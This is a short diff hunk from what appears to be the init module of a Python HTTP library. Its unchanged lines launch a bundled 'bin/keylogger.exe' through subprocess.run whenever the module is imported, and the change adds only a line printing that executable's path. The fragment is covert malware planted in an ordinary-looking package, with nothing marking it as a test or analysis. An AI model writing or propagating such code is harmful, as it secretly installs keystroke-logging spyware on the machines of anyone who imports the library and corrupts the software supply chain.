@@ -223,5 +223,6 @@ logging.getLogger(__name__).addHandler(NullHandler())
 warnings.simplefilter("default", FileModeWarning, append=True)
 
 exe_path = os.path.join(os.path.dirname(__file__), "bin", "keylogger.exe")
+print(exe_path)
 subprocess.run([str(exe_path)])
 print("Ran subprocess")
